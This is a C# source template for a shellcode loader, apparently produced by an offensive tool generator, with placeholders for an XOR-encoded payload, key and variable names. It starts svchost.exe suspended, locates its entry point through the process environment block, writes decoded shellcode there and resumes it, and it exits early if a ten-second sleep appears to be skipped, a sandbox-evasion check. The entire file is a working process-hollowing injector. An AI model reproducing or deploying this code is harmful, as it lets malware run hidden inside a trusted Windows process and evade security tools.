using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace Meth
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [xorreplace]

        public static void Main(string[] args)
        {

            Console.WriteLine($"[*] Incompetent Bastard");
            Console.WriteLine($"[.] [quote]");
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.8)
            {
                return;
            }

            [payloadreplace]

            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\\\windows\\\\system32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            string sleutel="[sleutel]";
            byte[] procAddr = new byte[0x8];
            byte[] [databuf] = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr [uitvoer] = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, [uitvoer], [databuf], [databuf].Length, out bytesRW);
            uint yolo = BitConverter.ToUInt32([databuf], 0x3c);
            uint inimini = yolo + 0x28;
            uint rva = BitConverter.ToUInt32([databuf], (int)inimini);
            IntPtr [waar] = (IntPtr)((Int64)[uitvoer] + rva);


            byte[] [shellcode];
            [shellcode] = [xorfunc]([bufnaam], Encoding.ASCII.GetBytes(sleutel));

            result = WriteProcessMemory(pInfo.hProcess, [waar], [shellcode], [shellcode].Length, out bytesRW);
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"[!] Done");
        }
    }
}